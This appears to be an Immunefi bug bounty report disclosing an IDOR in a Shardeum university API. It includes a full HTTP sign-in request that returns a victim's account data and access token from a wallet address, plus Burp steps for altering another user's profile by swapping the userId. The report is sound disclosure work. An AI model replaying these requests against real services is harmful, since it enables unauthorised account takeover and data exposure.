# #35446 \[W\&A-Insight] IDOR Able to change other user information

**Submitted on Sep 22nd 2024 at 21:46:11 UTC by @blocksmith0 for** [**Audit Comp | Shardeum: Ancillaries II**](https://immunefi.com/audit-competition/shardeum-ancillaries-ii-boost)

* **Report ID:** #35446
* **Report Type:** Websites and Applications
* **Report severity:** Insight
* **Target:** <https://immunefi.com>
* **Impacts:**
  * Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information, Commenting, Voting, Making trades, Withdrawals, etc.

## Description

## Vulnerability Details

Found an IDOR on \`api.university.shardeum.org\` the IDOR enables any user to change any user informations like name, email address, social media links, project links, description and other information.

To change other user information we need to get that user \`userId\` we can do this by just knowing the user wallet address which is public we can go to the explorer and get wallet addresses of some users and use that wallet address in the following HTTP request to get all the account information of that user that we want to change his/her information this is also an issue of it's own.

Using following HTTP request just change the \`walletAddress\` to the victim address to get all the account information of the victim.

Request:

\`\`\` POST /api/auth/signin HTTP/1.1 Host: api.university.shardeum.org Connection: close Content-Length: 62 sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121" Accept: application/json, text/plain, */* Content-Type: application/json sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 sec-ch-ua-platform: "Linux" Origin: <https://165.232.189.24> Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: <https://165.232.189.24/> Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9

{"walletAddress":"0x17daeE6958a71F4854d6359E88013663F439B499"} \`\`\`

Response:

\`\`\` HTTP/1.1 200 OK Server: nginx/1.24.0 (Ubuntu) Date: Sun, 22 Sep 2024 21:12:11 GMT Content-Type: application/json; charset=utf-8 Content-Length: 678 Connection: close X-Powered-By: Express Access-Control-Allow-Origin: \* Access-Control-Allow-Headers: x-access-token, Origin, Content-Type, Accept ETag: W/"2a6-XOQaNiWzJEGieswHDtMx43nPjIg" Vary: Accept-Encoding

{"type":"not-verified","\_id":"66f08643f519db4c16f3ad23","username":"victim","walletAddress":"0x17daeE6958a71F4854d6359E88013663F439B499","email":"<victim@gmail.com>","isVerified":false,"isBlocked":false,"displayName":"default","portfolio":"<https://sample.com/link","shardId":"areer333","designation":"developer","roles":\\[{"\\_id":"6564d2c72c178bc331526b9e","name":"user"}],"projects":\\[],"enrolledCourses":\\[],"createdAt":"2024-09-22T21:04:03.306Z","updatedAt":"2024-09-22T21:08:15.099Z","\\_\\_v":1,"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2ZjA4NjQzZjUxOWRiNGMxNmYzYWQyMyIsImlhdCI6MTcyNzAzOTUzMSwiZXhwIjoxNzI3MTI1OTMxfQ.S\\_aGvf\\_YjFIsp8OPmvuODwZfrf-h3XvwriEhyIeKKX8"}> \`\`\`

Now copy \`\_id\` this is the victim \`userId\`.

## Proof of Concept

## Proof of Concept

1. First login to your account and go to \`university.shardeum.org/profile/edit\`
2. Change name and click \`Save Changes\`
3. Intercept the request using burp proxy and send it to repeater
4. Now change the \`userId\` to victim \`userId\` that we get from the previous step and click on \`Go\`
5. Now the victim information has been changed login to victim account and check that the information has been changed.

This zero click IDOR meaning zero interaction is required.
